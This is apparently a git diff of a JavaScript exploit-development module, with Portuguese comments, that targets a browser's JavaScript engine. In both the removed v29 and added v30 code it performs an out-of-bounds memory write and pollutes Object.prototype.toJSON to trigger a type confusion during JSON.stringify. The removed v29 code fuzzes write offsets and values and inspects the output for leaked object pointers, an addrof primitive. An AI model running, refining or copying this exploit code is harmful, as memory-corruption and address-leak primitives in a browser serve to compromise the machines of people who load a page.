@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v29_OffsetAndValueFuzzing)
+// js/script3/testArrayBufferVictimCrash.mjs (v30_FixCircularLog_Primitives)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
@@ -9,155 +9,160 @@ import {
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF = "OriginalHeisenbug_TypedArrayAddrof_v29_OffsetValueFuzz";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V30_FCLP = "OriginalHeisenbug_TypedArrayAddrof_v30_FixCircularLog";
 
 const VICTIM_BUFFER_SIZE = 256;
-const OOB_TARGET_OFFSETS_V29 = [0x7C, 0x70, 0x68]; // Reduzido para menos iterações
-const OOB_WRITE_VALUES_V29 = [0xFFFFFFFF, 0x7FFFFFFF, 0xAAAAAAAA];
+const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
+const OOB_WRITE_VALUE = 0xFFFFFFFF;
 
-let object_to_leak_A_v29 = null;
-let object_to_leak_B_v29 = null;
-let victim_typed_array_ref_v29 = null; 
-let probe_call_count_v29 = 0;
-let last_probe_details_v29 = null; 
-const PROBE_CALL_LIMIT_V29 = 5; 
+// object_to_leak_A/B não são usados diretamente neste teste de logging
+let victim_typed_array_ref_v30 = null; 
+let probe_call_count_v30 = 0;
+let last_probe_details_v30 = null; // Objeto global para detalhes da última sonda
+const PROBE_CALL_LIMIT_V30 = 5; 
 
 
-function toJSON_TA_Probe_OffsetValueFuzz() {
-    probe_call_count_v29++;
-    const call_num = probe_call_count_v29;
+function toJSON_TA_Probe_FixCircularLog() {
+    probe_call_count_v30++;
+    const call_num = probe_call_count_v30;
+    // current_call_details é local para esta chamada da sonda e se tornará o 'this' confuso
     let current_call_details = {
         call_number: call_num,
-        probe_variant: "TA_Probe_Addrof_v29_OffsetValueFuzz",
-        this_type: Object.prototype.toString.call(this),
-        this_is_victim: (this === victim_typed_array_ref_v29),
-        this_is_prev_marker: (typeof this === 'object' && this !== null && this.hasOwnProperty('marker_id_v29') && this.marker_id_v29 === `MARKER_CALL_${call_num - 1}`),
-        writes_on_confused_this_attempted: false,
-        confused_this_keys: null,
+        probe_variant: "TA_Probe_Addrof_v30_FixCircularLog",
+        this_type: Object.prototype.toString.call(this), // Tipo do 'this' fornecido por JSON.stringify
+        is_this_victim_array: (this === victim_typed_array_ref_v30),
+        is_this_prev_marker: (typeof this === 'object' && this !== null && this.hasOwnProperty('marker_id_v30') && this.marker_id_v30 === `MARKER_CALL_${call_num - 1}`),
+        confused_this_received_primitives: false,
         error_in_probe: null
     };
-    // LogS3 verboso dentro da sonda pode ser demais para um loop de fuzzing, reduzir se necessário
-    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsPrevMarker? ${current_call_details.this_is_prev_marker}`, "dev_verbose");
+    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.is_this_victim_array}. IsPrevMarker? ${current_call_details.is_this_prev_marker}`, "leak");
 
     try {
-        if (call_num > PROBE_CALL_LIMIT_V29) {
-            last_probe_details_v29 = current_call_details;
-            return { recursion_stopped_v29: true };
+        if (call_num > PROBE_CALL_LIMIT_V30) {
+            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit. Returning stop object.`, "warn");
+            // Mesmo no limite, atualizamos last_probe_details_v30 com o estado desta chamada final
+            last_probe_details_v30 = current_call_details; 
+            return { recursion_stopped_v30: true, call: call_num };
         }
 
+        // A type confusion acontece quando 'this' (o current_call_details da chamada anterior, se is_this_prev_marker for true)
+        // ou um objeto genérico (se is_this_prev_marker for false) é tratado como [object Object]
         if (current_call_details.this_type === '[object Object]') { 
-            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION for 'this'! (IsVictim? ${current_call_details.this_is_victim}, IsPrevMarker? ${current_call_details.this_is_prev_marker})`, "vuln");
+            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION DETECTED for 'this'! (IsVictim? ${current_call_details.is_this_victim_array}, IsPrevMarker? ${current_call_details.this_is_prev_marker})`, "vuln");
             
-            if (object_to_leak_A_v29) this.leaky_A = object_to_leak_A_v29; // Usar propriedades nomeadas
-            if (object_to_leak_B_v29) this.leaky_B = object_to_leak_B_v29;
-            current_call_details.writes_on_confused_this_attempted = true;
-            try { current_call_details.confused_this_keys = Object.keys(this); } catch(e){}
+            // Atribuir apenas primitivas ao 'this' confuso (que é o current_call_details desta chamada)
+            // para evitar erro de estrutura circular ao logar.
+            this.confused_marker_property = true;
+            this.some_number_property = 12345;
+            this.another_string_prop = "test_string";
+            current_call_details.confused_this_received_primitives = true; // Indica que 'this' (current_call_details) foi modificado
+            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Primitives written to confused 'this'. Keys: ${Object.keys(this).join(',')}`, "info");
             
-            last_probe_details_v29 = current_call_details;
-            return this; // Retornar o 'this' confuso e modificado
+            last_probe_details_v30 = this; // 'this' é o current_call_details modificado
+            return this; // Retornar o 'this' confuso e modificado (que é current_call_details)
         }
     } catch (e) {
         current_call_details.error_in_probe = e.message;
+        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
     }
     
-    last_probe_details_v29 = current_call_details;
-    return { marker_id_v29: `MARKER_CALL_${call_num}` }; 
+    last_probe_details_v30 = current_call_details; // Garante que é atualizado
+    return { marker_id_v30: `MARKER_CALL_${call_num}` }; 
 }
 
-export async function executeTypedArrayVictimAddrofTest_OffsetValueFuzz() {
-    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF}`;
-    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (OffsetValueFuzzing) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF} Init...`;
+export async function executeTypedArrayVictimAddrofTest_FixCircularLog() {
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V30_FCLP}.triggerAndLog`;
+    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (FixCircularLog) ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V30_FCLP} Init...`;
 
-    let overall_results = [];
+    probe_call_count_v30 = 0;
+    last_probe_details_v30 = null; 
+    victim_typed_array_ref_v30 = null; 
+    // object_to_leak_A/B não são usados diretamente neste teste
 
-    for (const oob_offset of OOB_TARGET_OFFSETS_V29) {
-        for (const oob_value of OOB_WRITE_VALUES_V29) {
-            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${toHex(oob_offset,16)}_Val${toHex(oob_value)}`;
-            logS3(`\n===== ITERATION: Offset: ${toHex(oob_offset)}, Value: ${toHex(oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);
-
-            probe_call_count_v29 = 0;
-            last_probe_details_v29 = null; 
-            victim_typed_array_ref_v29 = null; 
-            object_to_leak_A_v29 = { marker: `ObjA_TA_v29_${toHex(oob_offset,16)}_${toHex(oob_value)}`, id: Date.now() }; 
-            object_to_leak_B_v29 = { marker: `ObjB_TA_v29_${toHex(oob_offset,16)}_${toHex(oob_value)}`, id: Date.now() + 1 };
-
-            let iterError = null;
-            let stringifyOutput_parsed = null; 
-            let iter_last_probe_details = null;
-            
-            let addrof_Victim_A = { success: false, msg: "VictimA: Default" };
-            let addrof_Output_LeakyA = { success: false, msg: "Output.leaky_A: Default"};
-            const fillPattern = 0.29292929292929;
-
-            try {
-                await triggerOOB_primitive({ force_reinit: true });
-                oob_write_absolute(oob_offset, oob_value, 4);
-                logS3(`  OOB Write: offset ${toHex(oob_offset)}, value ${toHex(oob_value)} done.`, "info", FNAME_CURRENT_ITERATION);
-                await PAUSE_S3(50); // Shorter pause
-
-                victim_typed_array_ref_v29 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
-                let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v29.buffer); 
-                for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
-                
-                const ppKey = 'toJSON';
-                let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-                let pollutionApplied = false;
-
-                try {
-                    Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_OffsetValueFuzz, writable: true, configurable: true, enumerable: false });
-                    pollutionApplied = true;
-                    let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v29); 
-                    try {
-                        stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
-                    } catch (e_parse) {
-                        stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
-                    }
-                    if (last_probe_details_v29) { // last_probe_details_v29 is the actual object from the last probe call
-                        iter_last_probe_details = JSON.parse(JSON.stringify(last_probe_details_v29)); 
-                    }
-                    logS3(`  Last probe details for this iter: ${iter_last_probe_details ? JSON.stringify(iter_last_probe_details) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);
-
-                    let tc_on_marker = iter_last_probe_details?.this_is_prev_marker && iter_last_probe_details?.this_type === "[object Object]";
-                        
-                    if (float64_view_on_victim_buffer[0] !== (fillPattern + 0)) addrof_Victim_A.msg = `Victim buffer[0] CHANGED! Val: ${float64_view_on_victim_buffer[0]}`;
-                    
-                    if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object') {
-                        const output_val_A = stringifyOutput_parsed.leaky_A; // Check for 'leaky_A'
-                        if (typeof output_val_A === 'number' && output_val_A !==0) {
-                            let out_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_A]).buffer)[0], new Uint32Array(new Float64Array([output_val_A]).buffer)[1]);
-                            if (out_A_int64.high() < 0x00020000 || (out_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
-                               addrof_Output_LeakyA.success = true; addrof_Output_LeakyA.msg = `Possible pointer for Output.leaky_A: ${out_A_int64.toString(true)}`;
-                            } else { addrof_Output_LeakyA.msg = `Output.leaky_A is num but not ptr: ${output_val_A}`; }
-                        } else if (output_val_A === object_to_leak_A_v29) {
-                             addrof_Output_LeakyA.success = true; addrof_Output_LeakyA.msg = "object_to_leak_A_v29 identity in Output.leaky_A.";
-                        } else { addrof_Output_LeakyA.msg = `Output.leaky_A not ptr. Val: ${output_val_A}`; }
-                    } else { addrof_Output_LeakyA.msg = "stringifyOutput was not an object or was null."; }
-
-                } catch (e_str) { iterError = e_str;
-                } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null, writable: true, configurable: true, enumerable: false }); }
-            } catch (e_outer) { iterError = e_outer;
-            } finally { clearOOBEnvironment(); }
-            
-            overall_results.push({
-                offset: toHex(oob_offset), value: toHex(oob_value), error: iterError ? `${iterError.name}: ${iterError.message}` : null,
-                probe_details: iter_last_probe_details, stringify_output: stringifyOutput_parsed,
-                addrof_victim_A: {...addrof_Victim_A}, addrof_output_leaky_A: {...addrof_Output_LeakyA}
-            });
-            if (addrof_Output_LeakyA.success) {
-                logS3(`!!!! POTENTIAL ADDROF SUCCESS at offset ${toHex(oob_offset)} val ${toHex(oob_value)} !!!!`, "vuln", FNAME_CURRENT_ITERATION);
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF}: Addr? ${toHex(oob_offset)}/${toHex(oob_value)} SUCCESS!`;
-            }
-            await PAUSE_S3(100); 
-        }
-    }
-
-    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
-    overall_results.forEach(res => {
-        logS3(`Off: ${res.offset}, Val: ${res.value}: AddrLeak Success=${res.addrof_output_leaky_A.success}. Last Probe 'this' type: ${res.probe_details?.this_type || 'N/A'}. Err: ${res.error || 'None'}`, 
-              res.addrof_output_leaky_A.success ? "good" : "warn", FNAME_CURRENT_TEST_BASE);
-    });
-    if (!document.title.includes("SUCCESS")) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF}: All Fuzz Tested.`;
+    let errorCapturedMain = null;
+    let stringifyOutput_parsed = null; 
+    let captured_last_probe_details_final = null;
     
-    return { overall_results: overall_results };
+    const fillPattern = 0.30303030303030;
+
+    try {
+        await triggerOOB_primitive({ force_reinit: true });
+        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
+        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
+        await PAUSE_S3(100);
+
+        victim_typed_array_ref_v30 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
+        // Preenchimento do buffer não é crítico para este teste de logging, mas mantido por consistência
+        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v30.buffer); 
+        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
+        logS3(`STEP 2: victim_typed_array_ref_v30 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
+        
+        const ppKey = 'toJSON';
+        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
+        let pollutionApplied = false;
+
+        try {
+            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_FixCircularLog, writable: true, configurable: true, enumerable: false });
+            pollutionApplied = true;
+            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v30); 
+            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
+            try {
+                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
+            } catch (e_parse) {
+                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
+            }
+            
+            // Faz uma cópia profunda da variável global 'last_probe_details_v30'
+            // que foi definida pela ÚLTIMA chamada da sonda.
+            if (last_probe_details_v30) { 
+                captured_last_probe_details_final = JSON.parse(JSON.stringify(last_probe_details_v30)); 
+            }
+            logS3(`  EXECUTE: Captured details of LAST probe run (deep copy of global 'last_probe_details_v30'): ${captured_last_probe_details_final ? JSON.stringify(captured_last_probe_details_final) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
+
+            let heisenbugConfirmed = false;
+            if (captured_last_probe_details_final && 
+                captured_last_probe_details_final.this_type === "[object Object]") {
+                heisenbugConfirmed = true;
+            }
+            logS3(`  EXECUTE: Heisenbug on 'this' of a probe call ${heisenbugConfirmed ? "CONFIRMED" : "NOT Confirmed"} by captured details. Last relevant 'this' type: ${captured_last_probe_details_final ? captured_last_probe_details_final.this_type : 'N/A'}`, heisenbugConfirmed ? "vuln" : "error", FNAME_CURRENT_TEST);
+            if(heisenbugConfirmed) {
+                 logS3(`    CONFIRMED Confused 'this' details: Call #${captured_last_probe_details_final.call_number}, IsVictim? ${captured_last_probe_details_final.is_this_victim}, IsPrevMarker? ${captured_last_probe_details_final.is_this_prev_marker}, PrimitivesWritten? ${captured_last_probe_details_final.confused_this_received_primitives}`, "info");
+            }
+                
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V30_FCLP}: ${heisenbugConfirmed ? "TC Log OK" : "TC Log Fail"}`;
+            if (captured_last_probe_details_final && captured_last_probe_details_final.recursion_stopped_v30) {
+                 document.title += " (Probe Limit)";
+            }
+
+
+        } catch (e_str) {
+            errorCapturedMain = e_str; // Captura o TypeError aqui
+            logS3(`    CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V30_FCLP}: Stringify/Log ERR`;
+        } finally {
+            if (pollutionApplied) {
+                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
+            }
+        }
+    } catch (e_outer_main) {
+        errorCapturedMain = e_outer_main;
+        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V30_FCLP} CRITICAL FAIL`;
+    } finally {
+        clearOOBEnvironment();
+        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
+        logS3(`Total probe calls: ${probe_call_count_v30}`, "info", FNAME_CURRENT_TEST);
+        // Addrof results não são o foco deste teste.
+        
+        victim_typed_array_ref_v30 = null; 
+        last_probe_details_v30 = null;
+        probe_call_count_v30 = 0;
+    }
+    return { 
+        errorOccurred: errorCapturedMain, 
+        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
+        stringifyResult: stringifyOutput_parsed, 
+        toJSON_details: captured_last_probe_details_final, 
+        total_probe_calls: probe_call_count_v30 // Este será 0 devido ao reset, mas o log acima mostra o valor correto.
+    };
 }
